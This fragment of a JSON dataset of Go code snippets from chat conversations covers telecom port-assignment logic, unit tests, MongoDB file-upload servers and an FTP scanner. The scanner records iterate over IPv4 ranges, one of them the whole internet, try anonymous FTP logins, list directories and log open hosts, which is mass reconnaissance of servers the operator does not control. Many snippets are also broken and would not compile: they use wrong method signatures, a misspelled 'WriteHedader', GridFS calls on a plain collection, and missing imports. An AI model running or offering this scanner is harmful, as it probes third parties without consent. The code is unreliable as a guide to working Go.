\"TN_IDL_C\"\n\t\t\t} else {\n\t\t\t\telasticran.TnPort = \"TN_A\"\n\t\t\t}\n\t\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_1_\") {\n\t\t\tif subNetwork == \"Shymkent\" {\n\t\t\t\telasticran.TnPort = \"TN_IDL_D\"\n\t\t\t} else {\n\t\t\t\telasticran.TnPort = \"TN_B\"\n\t\t\t}\n\t\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_2_\") {\n\t\t\tif subNetwork == \"Shymkent\" {\n\t\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t\t} else {\n\t\t\t\telasticran.TnPort = \"TN_A\"\n\t\t\t}\n\t\t}\n\t} else if len(nodes) == 2 {\n\t\tif strings.HasPrefix(name, \"GRBS\") {\n\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t\telasticran.TnPort2 = \"TN_IDL_D\"\n\t\t} else if strings.HasPrefix(name, \"ERBS\") {\n\t\t\tif subNetwork == \"Shymkent\" {\n\t\t\t\telasticran.TnPort = \"TN_IDL_D\"\n\t\t\t\telasticran.TnPort2 = \"TN_IDL_C\"\n\t\t\t} else {\n\t\t\t\telasticran.TnPort = \"TN_B\"\n\t\t\t\telasticran.TnPort2 = \"TN_A\"\n\t\t\t}\n\t\t}\n\t}\n}\n\ntype Nodes map[string]*Node\n\nfunc (nodes Nodes) Count() int {\n\tcount := 0\n\tfor _, node := range nodes {\n\t\tif len(node.EUtranCellData.CellsGroups) > 0 {\n\t\t\tcount++\n\t\t}\n\t}\n\treturn count\n}\n\nfunc (nodes Nodes) Names() []string {\n\tnames := make([]string, len(nodes))\n\ti := 0\n\tfor node := range nodes {\n\t\tnames[i] = node\n\t\ti++\n\t}\n\treturn names\n}",
    "filename": "1933730b1f2b0e8a028c34b1a88fe7ca_0.go"
  },
  {
    "conversation_hash": "1be3d16183048b1e44066772ddc630c8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// TestNodes_Count tests *model.Node.Count\nfunc TestNodes_Count(t *testing.T) {\n\tnodes := TestNodes(t)\n\tcount := nodes.Count()\n\tassert.Equal(t, 2, count)\n}\n\n// TestNodes_Names tests *model.Node.Names\nfunc TestNodes_Names(t *testing.T) {\n\tnodes := TestNodes(t)\n\tnames := nodes.Names()\n\tassert.Equal(t, []string{\"ERBS_41001_BCUKGU_2_KK1\", \"ERBS_41001_BCUKGU_2_KKT\"}, names)\n}",
    "filename": "1be3d16183048b1e44066772ddc630c8_0.go"
  },
  {
    "conversation_hash": "1be3d16183048b1e44066772ddc630c8",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "// TestEran_Port tests *model.EranConnection.port\nfunc TestEran_Port(t *testing.T) {\n\t// Create a sample EranConnection instance\n\tconnection := &EranConnection{\n\t\tENodeB: ENodeB{\n\t\t\tCellular: Cellular{\n\t\t\t\tName: \"ERBS_12345_NAME\",\n\t\t\t},\n\t\t},\n\t\tSubNetwork: SubNetwork{\n\t\t\tName: \"Subnet1\",\n\t\t},\n\t\tNodes: Nodes{\n\t\t\t\"Node1\": &Node{\n\t\t\t\tENodeB: ENodeB{\n\t\t\t\t\tCellular: Cellular{\n\t\t\t\t\t\tName: \"GRBS_54321_NAME\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t}\n\n\t// Call the port() method\n\tconnection.port()\n\n\t// Assert the values of TnPort and TnPort2 based on the provided conditions\n\tassert.Equal(t, \"TN_IDL_C\", connection.TnPort)\n\tassert.Equal(t, \"\", connection.TnPort2)\n}",
    "filename": "1be3d16183048b1e44066772ddc630c8_3.go"
  },
  {
    "conversation_hash": "1be3d16183048b1e44066772ddc630c8",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func TestEran_Port1(t *testing.T) {\n\t// Create a sample EranConnection instance\n\tconnection := &EranConnection{\n\t\tENodeB: ENodeB{\n\t\t\tSite: Site{\n\t\t\t\tCellular: Cellular{\n\t\t\t\t\tName: \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t\tSubNetwork: SubNetwork{\n\t\t\tName: \"Shymkent\",\n\t\t},\n\t\tNodes: Nodes{\n\t\t\t\"GRBS_41001_BCUKGU_1_KKT\": &Node{\n\t\t\t\tENodeB: ENodeB{\n\t\t\t\t\tSite: Site{\n\t\t\t\t\t\tCellular: Cellular{\n\t\t\t\t\t\t\tName: \"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\tEUtranCellData: EUtranCellData{\n\t\t\t\t\tCellsGroups: EUtranCellsGroups{\n\t\t\t\t\t\t\"Kcell\": &EUtranCells{\n\t\t\t\t\t\t\t\"41511A1L-D4L\": &EUtranCell{\n\t\t\t\t\t\t\t\tCellname: \"41511A1L-D4L\",\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t}\n\n\t// Call the port() method\n\tconnection.port()\n\n\t// Assert the values of TnPort and TnPort2 based on the provided conditions\n\tassert.Equal(t, \"TN_IDL_D\", connection.TnPort)\n\tassert.Equal(t, \"\", connection.TnPort2)\n}",
    "filename": "1be3d16183048b1e44066772ddc630c8_4.go"
  },
  {
    "conversation_hash": "dc6da51d1f72d6feb44609f324d06673",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package model\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n\n\tvalidation \"github.com/go-ozzo/ozzo-validation/v4\"\n)\n\n// EranConnection is custom type that represents Elastic Ran connection instance\n// used within the node of Radio Access Network\ntype EranConnection struct {\n\tVlan\n\tSubNetwork  `json:\"subNetwork\"`\n\tENodeB      `json:\"parent\"`\n\tConnection  string\n\tConnections []string\n\tTnPort      string\n\tTnPort2     string\n\tTnPorts     []string\n\tBridges     []string\n\tBridge      string\n\tNodes       Nodes `json:\"children\"`\n}\n\n// Nodes is a slice of Node\ntype Nodes []Node\n\n// Node represents a node in the network\ntype Node struct {\n\t// add your node fields here\n}\n\n// CleanEmpty removes nodes with empty cell data\nfunc (nodes Nodes) CleanEmpty() {\n\tvar cleanedNodes Nodes\n\tfor _, node := range nodes {\n\t\t// condition to check if the node has non-empty cell data\n\t\tif node.cellDataNotEmpty() {\n\t\t\tcleanedNodes = append(cleanedNodes, node)\n\t\t}\n\t}\n\tnodes = cleanedNodes\n}\n\n// cellDataNotEmpty checks if the cell data of a node is empty\nfunc (node Node) cellDataNotEmpty() bool {\n\t// add your condition to check if the cell data is not empty\n\treturn true\n}\n\n// Clean removes nodes with empty cell data\nfunc (elasticran *EranConnection) Clean() {\n\telasticran.Nodes.CleanEmpty()\n}",
    "filename": "dc6da51d1f72d6feb44609f324d06673_0.go"
  },
  {
    "conversation_hash": "4331bd9a4115926938be75169a6154f6",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func readLastLine(filename string) (lastLine string) {\n    file, err := os.Open(filename)\n    if err != nil {\n        return \"\"\n    }\n    defer file.Close()\n\n    scanner := bufio.NewScanner(file)\n    for scanner.Scan() {\n        lastLine = scanner.Text()\n    }\n\n    return lastLine\n}",
    "filename": "4331bd9a4115926938be75169a6154f6_1.go"
  },
  {
    "conversation_hash": "4331bd9a4115926938be75169a6154f6",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"net\"\n    \"os\"\n    \"time\"\n\n    \"github.com/jlaffaye/ftp\"\n)\n\nfunc main() {\n    var maxConcurrent int = 10\n    var ipAddresses []string\n    for i := 0; i < 256; i++ {\n        for j := 0; j < 4; j++ {\n            ipAddress := net.IPv4(i, j, 0, 0).String()\n            ipAddresses = append(ipAddresses, ipAddress)\n        }\n    }\n    fmt.Println(\"Scanning FTP servers...\")\n    allIpAddresses := make(chan string, len(ipAddresses))\n    openIpAddresses := make(chan string, len(ipAddresses))\n    for i := 0; i < maxConcurrent; i++ {\n        go func() {\n            for ipAddress := range ipAddresses {\n                ftpAddr, err := net.DialTimeout(\"tcp\", fmt.Sprintf(\"%s:21\", ipAddress), 1*time.Second)\n                if err == nil {\n                    defer ftpAddr.Close()\n                    if conn, err := ftp.NewClient(ftpAddr); err == nil {\n                        defer conn.Close()\n                        if user, pass, err := conn.Login(\"anonymous\", \"anonymous\"); err == nil {\n                            if fileList, err := conn.List(\".\"); err == nil {\n                                if _, err := os.Stdout.WriteString(fmt.Sprintf(\"%s\\n\", ipAddress)); err == nil {\n                                    openIpAddresses <- ipAddress\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }()\n    }\n    var lastLine string\n    if _, err := os.Stat(\"all.txt\"); err == nil && !os.IsNotExist(err) {\n        lastLine = readLastLine(\"all.txt\")\n        ipAddresses = append(ipAddresses, lastLine)\n    }\n    for ipAddress := range allIpAddresses {\n        if ipAddress != lastLine {\n            if conn, err := net.DialTimeout(\"tcp\", fmt.Sprintf(\"%s:21\", ipAddress), 1*time.Second); err == nil {\n                defer conn.Close()\n                if user, pass, err := conn.Login(\"anonymous\", \"anonymous\"); err == nil {\n                    if fileList, err := conn.List(\".\"); err == nil {\n                        if _, err := os.Stdout.WriteString(fmt.Sprintf(\"%s\\n\", ipAddress)); err == nil {\n                            openIpAddresses <- ipAddress\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n\nfunc readLastLine(filename string) (lastLine string) {\n    file, err := os.Open(filename)\n    if err != nil {\n        return \"\"\n    }\n    defer file.Close()\n\n    scanner := bufio.NewScanner(file)\n    for scanner.Scan() {\n        lastLine = scanner.Text()\n    }\n\n    return lastLine\n}",
    "filename": "4331bd9a4115926938be75169a6154f6_3.go"
  },
  {
    "conversation_hash": "4331bd9a4115926938be75169a6154f6",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "for i := 0; i < 256; i++ {\n    for j := 0; j < 4; j++ {\n        ipAddress := net.IPv4(i, j, 0, 0).String()\n        ipAddresses = append(ipAddresses, ipAddress)\n    }\n}",
    "filename": "4331bd9a4115926938be75169a6154f6_4.go"
  },
  {
    "conversation_hash": "4331bd9a4115926938be75169a6154f6",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "for i := 0; i < 256; i++ {\n    for j := 0; j < 256; j++ {\n        for k := 0; k < 256; k++ {\n            for l := 0; l < 256; l++ {\n                ipAddress := net.IPv4(i, j, k, l).String()\n                ipAddresses = append(ipAddresses, ipAddress)\n            }\n        }\n    }\n}",
    "filename": "4331bd9a4115926938be75169a6154f6_5.go"
  },
  {
    "conversation_hash": "4331bd9a4115926938be75169a6154f6",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "if fileList, err := conn.List(\".\"); err == nil {\n    if _, err := os.Stdout.WriteString(fmt.Sprintf(\"%s\\n\", ipAddress)); err == nil {\n        openIpAddresses <- ipAddress\n    }\n    // Записать адрес в файл \"all.txt\"\n    if file, err := os.OpenFile(\"all.txt\", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {\n        defer file.Close()\n        file.WriteString(ipAddress + \"\\n\")\n    }\n}",
    "filename": "4331bd9a4115926938be75169a6154f6_6.go"
  },
  {
    "conversation_hash": "4331bd9a4115926938be75169a6154f6",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n\t\"time\"\n\n\t\"github.com/jlaffaye/ftp\"\n)\n\nfunc main() {\n\tvar maxConcurrent int = 10\n\tvar ipAddresses []string\n\tfor i := 0; i < 256; i++ {\n\t\tfor j := 0; j < 4; j++ {\n\t\t\tipAddress := net.IPv4(i, j, 0, 0).String()\n\t\t\tipAddresses = append(ipAddresses, ipAddress)\n\t\t}\n\t}\n\tfmt.Println(\"Scanning FTP servers...\")\n\tallIpAddresses := make(chan string, len(ipAddresses))\n\topenIpAddresses := make(chan string, len(ipAddresses))\n\tfor i := 0; i < maxConcurrent; i++ {\n\t\tgo func() {\n\t\t\tfor ipAddress := range ipAddresses {\n\t\t\t\tftpAddr, err := net.DialTimeout(\"tcp\", fmt.Sprintf(\"%s:21\", ipAddress), 1*time.Second)\n\t\t\t\tif err == nil {\n\t\t\t\t\tdefer ftpAddr.Close()\n\t\t\t\t\tif conn, err := ftp.NewClient(ftpAddr); err == nil {\n\t\t\t\t\t\tdefer conn.Quit()\n\n\t\t\t\t\t\tif _, err := conn.Login(\"anonymous\", \"anonymous\"); err == nil {\n\t\t\t\t\t\t\tif fileList, err := conn.List(\".\"); err == nil {\n\t\t\t\t\t\t\t\tif _, err := os.Stdout.WriteString(fmt.Sprintf(\"%s\\n\", ipAddress)); err == nil {\n\t\t\t\t\t\t\t\t\topenIpAddresses <- ipAddress\n\t\t\t\t\t\t\t\t\tsaveToFile(\"open.txt\", ipAddress)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tsaveToFile(\"all.txt\", ipAddress)\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\t}\n\n\tfor ipAddress := range allIpAddresses {\n\t\tif conn, err := net.DialTimeout(\"tcp\", fmt.Sprintf(\"%s:21\", ipAddress), 1*time.Second); err == nil {\n\t\t\tdefer conn.Close()\n\t\t\tif user, pass, err := conn.Login(\"anonymous\", \"anonymous\"); err == nil {\n\t\t\t\tif fileList, err := conn.List(\".\"); err == nil {\n\t\t\t\t\tif _, err := os.Stdout.WriteString(fmt.Sprintf(\"%s\\n\", ipAddress)); err == nil {\n\t\t\t\t\t\topenIpAddresses <- ipAddress\n\t\t\t\t\t\tsaveToFile(\"open.txt\", ipAddress)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\nfunc saveToFile(filename string, ipAddress string) {\n\tfile, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)\n\tif err != nil {\n\t\tfmt.Println(\"Error opening file:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t_, err = file.WriteString(ipAddress + \"\\n\")\n\tif err != nil {\n\t\tfmt.Println(\"Error writing to file:\", err)\n\t\treturn\n\t}\n}",
    "filename": "4331bd9a4115926938be75169a6154f6_7.go"
  },
  {
    "conversation_hash": "4331bd9a4115926938be75169a6154f6",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "for i := 0; i < maxConcurrent; i++ {\n    go func() {\n        // ...\n    }()\n}",
    "filename": "4331bd9a4115926938be75169a6154f6_8.go"
  },
  {
    "conversation_hash": "84b4f3c2a6ac02d5df36bbffb17ee5a1",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "client, err := mongo.NewClient(options.Client().ApplyURI(\"mongodb://localhost:27017\"))\nif err != nil {\n    log.Fatal(err)\n}\n\nctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)\ndefer cancel()\n\nif err := client.Connect(ctx); err != nil {\n    log.Fatal(err)\n}\n\ndb := client.Database(\"mydatabase\")\nfs := gridfs.NewBucket(db)",
    "filename": "84b4f3c2a6ac02d5df36bbffb17ee5a1_1.go"
  },
  {
    "conversation_hash": "84b4f3c2a6ac02d5df36bbffb17ee5a1",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "file, err := os.Open(\"path/to/file\")\nif err != nil {\n    log.Fatal(err)\n}\n\ndefer file.Close()\n\nid, err := fs.UploadFromStream(\"filename\", file)\nif err != nil {\n    log.Fatal(err)\n}\n\nlog.Println(\"File uploaded with ID:\", id.Hex())",
    "filename": "84b4f3c2a6ac02d5df36bbffb17ee5a1_2.go"
  },
  {
    "conversation_hash": "84b4f3c2a6ac02d5df36bbffb17ee5a1",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    router := mux.NewRouter()\n\n    router.HandleFunc(\"/files\", GetFiles).Methods(\"GET\")\n    router.HandleFunc(\"/files/{id}\", GetFile).Methods(\"GET\")\n    router.HandleFunc(\"/files/{id}/info\", GetFileInfo).Methods(\"GET\")\n    router.HandleFunc(\"/files\", UploadFile).Methods(\"POST\")\n    router.HandleFunc(\"/files/{id}\", UpdateFile).Methods(\"UPDATE\")\n    router.HandleFunc(\"/files/{id}\", DeleteFile).Methods(\"DELETE\")\n\n    log.Fatal(http.ListenAndServe(\":8000\", router))\n}",
    "filename": "84b4f3c2a6ac02d5df36bbffb17ee5a1_3.go"
  },
  {
    "conversation_hash": "91c0b594a615b3149168e9d3e664a5bb",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\n\t\"github.com/gorilla/mux\"\n\t\"go.mongodb.org/mongo-driver/mongo\"\n\t\"go.mongodb.org/mongo-driver/mongo/options\"\n)\n\ntype File struct {\n\tID   string `json:\"id\"`\n\tName string `json:\"name\"`\n\tSize int64  `json:\"size\"`\n}\n\nvar collection *mongo.Collection\n\nfunc main() {\n\t// Подключение к MongoDB\n\terr := connectToDB()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Инициализация роутера\n\trouter := mux.NewRouter()\n\n\t// Регистрация обработчиков для REST-ручек\n\trouter.HandleFunc(\"/files\", getFiles).Methods(\"GET\")\n\trouter.HandleFunc(\"/files/{id}\", getFileByID).Methods(\"GET\")\n\trouter.HandleFunc(\"/files/{id}/info\", getFileInfo).Methods(\"GET\")\n\trouter.HandleFunc(\"/files\", uploadFile).Methods(\"POST\")\n\trouter.HandleFunc(\"/files/{id}\", updateFile).Methods(\"UPDATE\")\n\trouter.HandleFunc(\"/files/{id}\", deleteFile).Methods(\"DELETE\")\n\n\t// Запуск HTTP-сервера\n\tport := os.Getenv(\"PORT\")\n\tif port == \"\" {\n\t\tport = \"8080\"\n\t}\n\tfmt.Println(\"Server is listening on port\", port)\n\tlog.Fatal(http.ListenAndServe(\":\"+port, router))\n}\n\n// Подключение к MongoDB\nfunc connectToDB() error {\n\tctx := context.Background()\n\tclientOptions := options.Client().ApplyURI(os.Getenv(\"MONGO_URI\"))\n\tclient, err := mongo.Connect(ctx, clientOptions)\n\tif err != nil {\n\t\treturn err\n\t}\n\terr = client.Ping(ctx, nil)\n\tif err != nil {\n\t\treturn err\n\t}\n\tfmt.Println(\"Connected to MongoDB!\")\n\tcollection = client.Database(\"files_db\").Collection(\"files\")\n\treturn nil\n}\n\n// Получение списка файлов\nfunc getFiles(w http.ResponseWriter, r *http.Request) {\n\tctx := context.Background()\n\tcursor, err := collection.Find(ctx, nil)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\tdefer cursor.Close(ctx)\n\n\tvar files []File\n\tfor cursor.Next(ctx) {\n\t\tvar file File\n\t\terr := cursor.Decode(&file)\n\t\tif err != nil {\n\t\t\tlog.Println(err)\n\t\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t\tfiles = append(files, file)\n\t}\n\n\t// Отправка списка файлов в формате JSON\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tjson.NewEncoder(w).Encode(files)\n}\n\n// Получение файла по ID\nfunc getFileByID(w http.ResponseWriter, r *http.Request) {\n\t// Извлечение ID файла из URL-параметра\n\tvars := mux.Vars(r)\n\tid := vars[\"id\"]\n\n\tctx := context.Background()\n\n\t// Получение файла из GridFS по его ID\n\tfile, err := collection.FindOne(ctx, bson.M{\"id\": id}).Decode(&file)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHedader(http.StatusNotFound)\n\t\treturn\n\t}\n\n\t// Отправка файла в виде байтового потока\n\tw.Header().Set(\"Content-Disposition\", \"attachment; filename=\"+file.Name)\n\tio.Copy(w, file)\n}\n\n// Получение информации о файле по ID\nfunc getFileInfo(w http.ResponseWriter, r *http.Request) {\n\t// Извлечение ID файла из URL-параметра\n\tvars := mux.Vars(r)\n\tid := vars[\"id\"]\n\n\tctx := context.Background()\n\n\t// Получение информации о файле из MongoDB\n\tfile, err := collection.FindOne(ctx, bson.M{\"id\": id}).Decode(&file)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHedader(http.StatusNotFound)\n\t\treturn\n\t}\n\n\t// Отправка информации о файле в формате JSON\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tjson.NewEncoder(w).Encode(file)\n}\n\n// Загрузка файла\nfunc uploadFile(w http.ResponseWriter, r *http.Request) {\n\t// Извлечение файла из multipart/form-data\n\terr := r.ParseMultipartForm(10 << 20) // Максимальное значение размера файла - 10 МБ\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusBadRequest)\n\t\treturn\n\t}\n\n\t// Получение объекта файла из формы\n\tfile, handler, err := r.FormFile(\"file\")\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusBadRequest)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t// Сохранение файла в GridFS и запись информации о нем в MongoDB\n\tctx := context.Background()\n\tid := bson.NewObjectId().Hex() // Генерация уникального ID для файла\n\tgridFSUploadStream, err := collection.OpenUploadStreamWithID(ctx, id, handler.Filename)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\tdefer gridFSUploadStream.Close()\n\n\t// Копирование данных файла в GridFS\n\t_, err = io.Copy(gridFSUploadStream, file)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\t// Создание объекта файла для записи информации в MongoDB\n\tnewFile := File{\n\t\tID:   id,\n\t\tName: handler.Filename,\n\t\tSize: gridFSUploadStream.Length(),\n\t}\n\n\t// Запись информации о файле в MongoDB\n\t_, err = collection.InsertOne(ctx, newFile)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\tw.WriteHeader(http.StatusCreated)\n}\n\n// Обновление файла по ID\nfunc updateFile(w http.ResponseWriter, r *http.Request) {\n\t// Извлечение ID файла из URL-параметра\n\tvars := mux.Vars(r)\n\tid := vars[\"id\"]\n\n\t// Получение объекта файла из формы\n\tfile, handler, err := r.FormFile(\"file\")\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusBadRequest)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t// Поиск файла по ID в MongoDB\n\tctx := context.Background()\n\t_, err = collection.UpdateOne(ctx, bson.M{\"id\": id}, bson.M{\"$set\": bson.M{\"name\": handler.Filename}})\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\tgridFSUploadStream, err := collection.OpenUploadStreamWithID(ctx, id, handler.Filename)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\tdefer gridFSUploadStream.Close()\n\n\t// Копирование данных файла в GridFS\n\t_, err = io.Copy(gridFSUploadStream, file)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\tw.WriteHeader(http.StatusOK)\n}\n\n// Удаление файла по ID\nfunc deleteFile(w http.ResponseWriter, r *http.Request) {\n\t// Извлечение ID файла из URL-параметра\n\tvars := mux.Vars(r)\n\tid := vars[\"id\"]\n\n\t// Удаление файла из GridFS по его ID\n\tctx := context.Background()\n\t_, err := collection.DeleteOne(ctx, bson.M{\"id\": id})\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\tw.WriteHeader(http.StatusOK)\n}",
    "filename": "91c0b594a615b3149168e9d3e664a5bb_0.go"
  },
  {
    "conversation_hash": "b4563053eae3eb8bef8049786c643f2e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"html/template\"\n\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"\n\n\t\"gopkg.in/mgo.v2\"\n\t\"gopkg.in/mgo.v2/bson\"\n)\n\ntype File struct {\n\tID   bson.ObjectId `bson:\"_id,omitempty\"`\n\tName string        `bson:\"name\"`\n\tPath string        `bson:\"path\"`\n}\n\nfunc main() {\n\t// Установка обработчиков маршрутов\n\thttp.HandleFunc(\"/\", viewHandler)\n\thttp.HandleFunc(\"/upload\", uploadHandler)\n\n\t// Запуск сервера\n\tfmt.Println(\"Server started on http://localhost:27017\")\n\thttp.ListenAndServe(\":27017\", nil)\n}\n\nfunc viewHandler(w http.ResponseWriter, r *http.Request) {\n\t// Загрузка шаблона\n\ttmpl := template.Must(template.ParseFiles(\"templates/index.html\"))\n\n\t// Отображение шаблона в ответе\n\ttmpl.Execute(w, nil)\n}\n\nfunc uploadHandler(w http.ResponseWriter, r *http.Request) {\n\t// Получение загруженного файла\n\tfile, header, err := r.FormFile(\"file\")\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t// Создание директории для загрузки файлов\n\tdir := \"./uploads/\"\n\terr = os.MkdirAll(dir, os.ModePerm)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\t// Создание файла на сервере\n\tfilePath := filepath.Join(dir, header.Filename)\n\tout, err := os.Create(filePath)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tdefer out.Close()\n\n\t// Копирование содержимого загруженного файла в созданный файл на сервере\n\t_, err = io.Copy(out, file)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\t// Сохранение информации о файле в MongoDB\n\tsession, err := mgo.Dial(\"mongodb://localhost:27017\")\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tdefer session.Close()\n\n\tc := session.DB(\"test\").C(\"files\")\n\terr = c.Insert(&File{Name: header.Filename, Path: filePath})\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\t// Отправка ответа об успешной загрузке файла\n\tfmt.Fprintf(w, \"File uploaded successfully!\")\n}",
    "filename": "b4563053eae3eb8bef8049786c643f2e_0.go"
  },
  {
    "conversation_hash": "5be4fae011de1d826e135d89f2218d9b",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func handleFileUpload(w http.ResponseWriter, r *http.Request) {\n    if r.Method == http.MethodGet {\n        // Отправка HTML формы для загрузки файла\n        cursor, err := collection.Find(context.Background(), bson.D{{}})\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n        defer cursor.Close(context.Background())\n\n        var files []string\n        for cursor.Next(context.Background()) {\n            var result bson.M\n            if err := cursor.Decode(&result); err != nil {\n                http.Error(w, err.Error(), http.StatusInternalServerError)\n                return\n            }\n            files = append(files, result[\"_id\"].(primitive.ObjectID).Hex())\n        }\n\n        // Отправка HTML формы для загрузки файла с списком файлов\n        tmpl := template.Must(template.ParseFiles(\"upload.html\"))\n        tmpl.Execute(w, struct{ Files []string }{files})\n    } else if r.Method == http.MethodPost {\n        file, _, err := r.FormFile(\"file\")\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n        defer file.Close()\n\n        data, err := ioutil.ReadAll(file)\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n\n        _, err = collection.InsertOne(context.Background(), bson.D{{\"data\", data}})\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n\n        fmt.Fprintln(w, \"Файл успешно загружен!\")\n    } else {\n        http.Error(w, \"Метод не поддерживается\", http.StatusMethodNotAllowed)\n    }\n}",
    "filename": "5be4fae011de1d826e135d89f2218d9b_1.go"
  },
  {
    "conversation_hash": "5be4fae011de1d826e135d89f2218d9b",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func handleFileDeletion(w http.ResponseWriter, r *http.Request) {\n    if r.Method == http.MethodDelete {\n        // Получение id файла из URL\n        fileID := strings.TrimPrefix(r.URL.Path, \"/files/\")\n\n        // Отправка HTML формы для удаления файла по id\n        tmpl := template.Must(template.ParseFiles(\"delete.html\"))\n        tmpl.Execute(w, struct{ ID string }{ID: fileID})\n    } else if r.Method == http.MethodPost {\n        // Получение id файла из URL\n        fileID := strings.TrimPrefix(r.URL.Path, \"/files/\")\n\n        // Преобразование строки id в ObjectID\n        objectID, err := primitive.ObjectIDFromHex(fileID)\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusBadRequest)\n            return\n        }\n\n        // Удаление файла из базы данных\n        _, err = collection.DeleteOne(context.Background(), bson.M{\"_id\": objectID})\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n\n        fmt.Fprintln(w, \"Файл успешно удален!\")\n    } else {\n        http.Error(w, \"Метод не поддерживается\", http.StatusMethodNotAllowed)\n    }\n}",
    "filename": "5be4fae011de1d826e135d89f2218d9b_2.go"
  },
  {
    "conversation_hash": "0251e8e63f0a90f3ff210915ed36e805",
